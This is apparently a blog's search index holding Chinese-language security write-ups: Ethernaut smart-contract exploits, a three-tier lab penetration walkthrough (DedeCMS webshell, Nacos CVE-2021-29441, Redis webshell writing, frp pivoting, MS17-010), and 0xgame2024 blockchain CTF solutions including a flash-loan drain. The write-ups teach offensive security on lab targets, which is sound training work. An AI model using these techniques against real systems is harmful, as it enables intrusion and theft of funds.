<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Ethernaut</title>
      <link href="/2025/02/26/%E9%9D%B6%E5%9C%BA-Ethernaut/"/>
      <url>/2025/02/26/%E9%9D%B6%E5%9C%BA-Ethernaut/</url>
      
        <content type="html"><![CDATA[<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>You will beat this level if:</p><ol><li>you claim ownership of the contract</li><li>you reduce its balance to 0</li></ol><p>source code:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>First, we need to consider how to take ownership</p><p>Notice that in both functions, <code>contribute()</code> and <code>receive()</code>, such a possibility exists: <code>owner = msg.sender</code></p><p>However, in <code>contribute()</code> function, it is almost impossible to satisfy this condition</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So, we focus on the <code>receive()</code> function, which only requires a small contribution and a money transfer to make us the owner</p><p>We can call these functions as follows in console:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>: <span class="number">1</span>&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>: <span class="number">1</span>&#125;) <span class="comment">//Triggering receive function</span></span><br></pre></td></tr></table></figure><p>In this way, we become the owner. After that we withdraw all the funds, thereby completing the challenge</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>()</span><br></pre></td></tr></table></figure><h2 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h2><p>Claim ownership of the contract below to complete this level</p><p>source code:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    /* constructor */</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透打靶</title>
      <link href="/2024/12/23/%E9%9D%B6%E5%9C%BA-2024-12-23-layer3/"/>
      <url>/2024/12/23/%E9%9D%B6%E5%9C%BA-2024-12-23-layer3/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vm1: windows10---DMZ区 162段(公网),37段</span><br><span class="line">vm2: Ubuntu---内网主机 37段,52段</span><br><span class="line">vm3: windows7---核心区 52段</span><br></pre></td></tr></table></figure><h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>扫162段, 找到存活主机(.128和.130为攻击机ip)<br><img src="https://s2.loli.net/2024/12/23/3Vwr8pIztRQsBxW.png" alt="1"></p><p>扫.129机器, 发现开放的8080以及21端口<br><img src="https://s2.loli.net/2024/12/23/sjQUyIK5xuhGO9L.png" alt="1"></p><p>ftp爆破失败, 访问8080服务, 发现是DedeCms, 版本是DedeCMS_V57_UTF8_SP2<br>利用弱口令:admin,admin进后台</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241223235908.png" alt="1"></p><p>根据nday传马: <a href="https://www.cnblogs.com/punished/p/14743203.html">https://www.cnblogs.com/punished/p/14743203.html</a></p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224000352.png" alt="1"></p><p>拿到DMZ区shell</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224000444.png" alt="1"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h3><p>通过DMZ区的shell探测内网, 发现37段网卡</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224000556.png" alt="1"></p><p>上传fscan, 扫描37段存活主机, 发现.3ip主机</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224000755.png" alt="1"></p><p>扫描此ip, 发现开放的redis服务和nacos服务以及一个80web服务<br>此外22端口ssh和6379端口redis爆破失败</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224000848.png" alt="1"></p><p>上传frp做内网穿透</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224001107.png" alt="1"></p><p>用proxyifier做代理后, 成功访问到内网服务<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224001200.png" alt="1"></p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224001240.png" alt="1"></p><p>接下来kali挂上代理后扫描内网web服务目录</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224001432.png" alt="1"></p><p>注意到扫描出phpinfo目录</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224001538.png" alt="1"></p><p>访问查看泄露的网站绝对路径, 考虑到后期通过redis写马</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224001921.png" alt="1"></p><p>对于nacos服务, 利用CVE-2021-29441 Nacos未授权访问进入后台(这里注意要做上下游代理)</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224002101.png" alt="1"></p><p>发现后台存储的密码</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224002258.png" alt="1"></p><p>猜测是redis服务密码, 尝试登录成功</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224002407.png" alt="1"></p><p>通过info命令可以收集一些信息, 包括redis版本可以打一些nday<br>这里利用刚才的网站绝对路径写马进去</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224002510.png" alt="1"></p><p>尝试连接, 成功拿到第二层shell</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224002613.png" alt="1"></p><h3 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h3><p>同样的进行信息收集, 发现52网段<br>传入fscan, 进行第二层后的内网扫描, 发现.5存活主机</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224002813.png" alt="1"></p><p>进行单ip扫描, 发现MS17-010漏洞</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224002941.png" alt="1"></p><p>接下来在DMZ区传入frps, 第二层传入frpc, 做代理链将三层主机内网转发到公网</p><p>之后就是常规的打永恒之蓝, 挂上代理链msf直接利用</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/20241224003341.png" alt="1"></p><p>但实际msf利用失败, 尝试使用图形化工具正向利用</p><p>设置好windows代理链(顺序由外到内)</p><p><img src="https://s2.loli.net/2024/12/25/YfrepBhNnDdvzkH.png" alt="1"></p><p>工具扫描</p><p><img src="https://s2.loli.net/2024/12/25/XBNFW7gisuh6tjT.png" alt="1"></p><p>成功利用漏洞(工具利用注入dll文件创建一个本地用户)</p><p><img src="https://s2.loli.net/2024/12/25/cGHsJB6ib8OI3Fm.png" alt="1"></p><p>远程桌面连接</p><p><img src="https://s2.loli.net/2024/12/25/hGe2di6ojx8wT71.png" alt="1"></p><p>成功连接, 后面有机会利用其他手法再打一次</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xgame2024-blockchain</title>
      <link href="/2024/10/28/CTF-0xgame2024%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
      <url>/2024/10/28/CTF-0xgame2024%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<p>详解: <a href="https://www.bilibili.com/video/BV1i41TYqErk/">在0xgameCTF中手把手式教学的区块链安全入门视频 (一)_哔哩哔哩_bilibili</a></p><p>可以跟着视频手把手的实操一遍</p><h2 id="肘，上链"><a href="#肘，上链" class="headerlink" title="肘，上链"></a>肘，上链</h2><p>这道题作为签到题, 解法还是很简单的, 通过这道题先具体讲一下解这个方向的题目该如何操作吧</p><p><img src="https://s2.loli.net/2024/12/25/7ZD56KPhBWtrdQm.png" alt="1"></p><p>这是区块链题目一般会给出的一些条件, 逐个先来解释一下</p><ul><li><p>nc:  用带有netcat的设备连接输入此命令, 连接到题目的部署器, 可以开启区块链题目的环境</p></li><li><p>rpc: 远程过程调用协议, 在区块链中是节点与节点之间的通信方式, 通过这个网址, 你可以连接上题目的区块链网络, 使你可以和题目的合约交互</p></li><li><p>faucet: 中文译文为水龙头, 顾名思义, 你可以用它来为账户”接水”, 它可以免费分发测试用的加密货币</p></li></ul><p>接下来, 你需要先使用nc连接, 看到以下画面</p><p><img src="https://s2.loli.net/2024/12/25/BrVPzICetDU7KbN.png" alt="1"></p><p>这里有几个选项, 大家可以自行翻译下, 大概就是”<strong>创建账户—&gt;部署合约—&gt;检查结果, 以及展示源码</strong>“<br>最后需要满足isSolved()函数为true, 即可拿到flag完成题目</p><p>所以我们当然先要看一下源码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Signin &#123;</span><br><span class="line">    bytes32 signin;</span><br><span class="line"></span><br><span class="line">    constructor () &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function sign(bytes32 _signin) public &#123;</span><br><span class="line">        signin = _signin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        string memory expected = &quot;Hello0xBlockchain&quot;;</span><br><span class="line">        return keccak256(abi.encodePacked(expected)) == signin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的逻辑, 为了使<strong>isSolve()</strong>&#x51FD;数为true, 需要满足<code>keccak256(abi.encodePacked(expected)) == signin</code></p><p>而其中signin的值我们可以通过<strong>sign()</strong>&#x51FD;数传入我们构造好的参数值, 赋值给signin满足等式</p><p>那么我们可以写一个合约计算下<code>keccak256(abi.encodePacked(&quot;Hello0xBlockchain&quot;))</code>的值, 再手动传给题目合约&#x7684;<strong>_signin</strong>参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Signin &#123;</span><br><span class="line">    bytes32 public signin;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function calculateHash() public pure returns (bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(&quot;Hello0xBlockchain&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们怎么连接到题目的区块链网络并调用我们的合约呢</p><p>首先我们需要一个浏览器插件<strong>MetaMask</strong>以及一个在线ide:<strong>Remix</strong></p><p>然后在MetaMask中创建一个钱包, 到题目的水龙头中接水(拿到一个ETH), 并且连接到题目的区块网络中</p><p><img src="https://s2.loli.net/2024/12/25/yZXqlW7CtwNDgTc.png" alt="1"></p><p>然后在Remix中连接上我们的钱包</p><p><img src="https://s2.loli.net/2024/12/25/tYdMKvogCrFuZS6.png" alt="1"></p><p>这样就可以通过我们的钱包账户利用Remix去远程调用这个网络中的一些链了, 接下来在nc中让题目部署好合约, 拿到合约的地址</p><p><img src="https://s2.loli.net/2024/12/25/LIUv8n3QAj4Y9ts.png" alt="1"></p><p>在Remix中, 编译好合约, 通过At Address远程调用这个地址上的题目合约, 接下来就可以开始解题了(下面还会介绍利用脚本远程交互合约的方法)</p><p><img src="https://s2.loli.net/2024/12/25/Ax9XMm1JkYsltiN.png" alt="1"></p><p>调用我们的计算合约中<strong>calculateHash()</strong>&#x51FD;数, 拿到结果</p><p><img src="https://s2.loli.net/2024/12/25/recCMnqRS9mKf2w.png" alt="1"></p><p>传入题目合约中的<strong>sign(bytes32 _signin)</strong>, 调用isSolved验证一下, 完成题目</p><p><img src="https://s2.loli.net/2024/12/25/46DOFk1qntHXIus.png" alt="1"></p><p>然后这里再贴一个web3.py的脚本调用合约的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTPProvider:</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&quot;http://156.238.233.7:8545&quot;</span>))  <span class="comment"># rpc</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;连接状态:&quot;</span>, w3.is_connected())</span><br><span class="line"></span><br><span class="line">hacker = <span class="string">&quot;&quot;</span>  <span class="comment"># attacker address</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span>  <span class="comment"># contract address</span></span><br><span class="line">privateKey = <span class="string">&quot;&quot;</span>  <span class="comment"># attacker privateKey</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">sender, func, value=<span class="number">0</span>, gas=<span class="number">0x300000</span></span>):</span><br><span class="line">    txn = func.build_transaction(&#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(sender),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span>: gas,</span><br><span class="line">        <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="number">1.1</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: w3.to_wei(value, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">    &#125;)</span><br><span class="line">    signed_txn = w3.eth.account.sign_transaction(txn, privateKey)</span><br><span class="line">    txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)</span><br><span class="line">    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;txn_hash=&quot;</span>, txn_hash.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="keyword">return</span> txn_receipt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置abi</span></span><br><span class="line">abi = json.load(<span class="built_in">open</span>(<span class="string">&quot;0xgame.json&quot;</span>))[<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">contract = w3.eth.contract(abi=abi, address=w3.to_checksum_address(target))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程交互</span></span><br><span class="line"></span><br><span class="line">expected_message = <span class="string">&quot;Hello0xBlockchain&quot;</span></span><br><span class="line">expected_hash = w3.keccak(text=expected_message)</span><br><span class="line"><span class="comment"># 调用 sign 函数</span></span><br><span class="line">sign_txn = contract.functions.sign(expected_hash)</span><br><span class="line">run(hacker, sign_txn)</span><br><span class="line"><span class="comment"># 调用 isSolved 函数</span></span><br><span class="line">is_solved = contract.functions.isSolved().call()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;题目状态: <span class="subst">&#123;is_solved&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="theft"><a href="#theft" class="headerlink" title="theft"></a>theft</h2><p>这道题启动和刚才不太一样, 可以直接访问这个部署器<a href="http://theft.zysgmzb.club/">http://theft.zysgmzb.club/</a></p><p><img src="https://s2.loli.net/2024/12/25/BIZ5nGL6UEgdKX4.png" alt="1"></p><p>顺便粘一下hint, 正好里面有启动题目的方法</p><p><img src="https://s2.loli.net/2024/12/25/LPdIJDkvMagBT3Q.png" alt="1"></p><p>看第一个hint, 按照步骤操作, 我们就成功开启了一个区块链实例, 然后和上一题操作方式就一样了</p><p><img src="https://s2.loli.net/2024/12/25/J7T4iAqUB3vtyDz.png" alt="1"></p><p>这道题就开始攻击一些合约漏洞了, 然后同样的先分析下源码</p><ul><li>flash.sol</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface FlashLoanReceiver &#123;</span><br><span class="line">    function execute() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Pool &#123;</span><br><span class="line">    mapping(address =&gt; uint256) private balances;</span><br><span class="line">    uint public totalSupply;</span><br><span class="line">    uint public maxloanamount = 100 ether;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">        totalSupply += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 amount = balances[msg.sender];</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">        payable(msg.sender).transfer(amount);</span><br><span class="line">        totalSupply -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address user) external view returns (uint256) &#123;</span><br><span class="line">        return balances[user];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        require(amount &lt;= maxloanamount, &quot;Amount too high&quot;);</span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line">        require(balanceBefore &gt;= amount, &quot;No enough balance here&quot;);</span><br><span class="line"></span><br><span class="line">        FlashLoanReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line"></span><br><span class="line">        require(address(this).balance &gt;= balanceBefore, &quot;no money back&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Setup.sol</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./flash.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Setup &#123;</span><br><span class="line">    Pool public TARGET;</span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        TARGET = new Pool();</span><br><span class="line">        TARGET.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isSolved() external view returns (bool) &#123;</span><br><span class="line">        return (TARGET.totalSupply() == 1000 ether &amp;&amp;</span><br><span class="line">            address(TARGET).balance &lt; 10 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么先看下第二个合约, 完成题目的条件: <strong>totalSupply</strong>的值不变(原值为1000), 并且取走贷款池的资金直到小于10eth</p><p>然后再分析下借贷合约中的逻辑, <code>借贷:flashLoan(), 存钱:deposit(), 取钱:withdraw(), 查询金额:balanceOf()以及一个需要重写的execute()函数</code></p><p>其中在借贷部分做了一些限制, 首先就是单次借贷的金额要小于100eth</p><p>然后就是最主要的最后一行的限制, 要求你通过重写的execute()中借钱进行完一些操作就要及时还钱(也称为闪电贷), 不然在调用execute()后资金池中的钱(<code>address(this).balance</code>)若是比调用execute()前的资金(<code>balanceBefore</code>)少了, 就代表你没有还钱, 也就会直接revert结束这次交易</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(uint256 amount) external &#123;</span><br><span class="line">   require(amount &lt;= maxloanamount, &quot;Amount too high&quot;);</span><br><span class="line">   uint256 balanceBefore = address(this).balance;</span><br><span class="line">   require(balanceBefore &gt;= amount, &quot;No enough balance here&quot;);</span><br><span class="line"></span><br><span class="line">   FlashLoanReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line"></span><br><span class="line">   require(address(this).balance &gt;= balanceBefore, &quot;no money back&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们可以利用这个合约的一些缺陷进行闪电贷攻击, 绕过这个限制取走这个池中的钱</p><p>在重写execute()这个函数时, 我们可以调用这个池中的deposit()把钱存进池中代替还钱, 在之后的withdraw()中还可以把存进的钱取出, 白嫖到借贷的资金, 那么我们可以根据这个思路编写一个攻击合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IPool &#123;</span><br><span class="line">    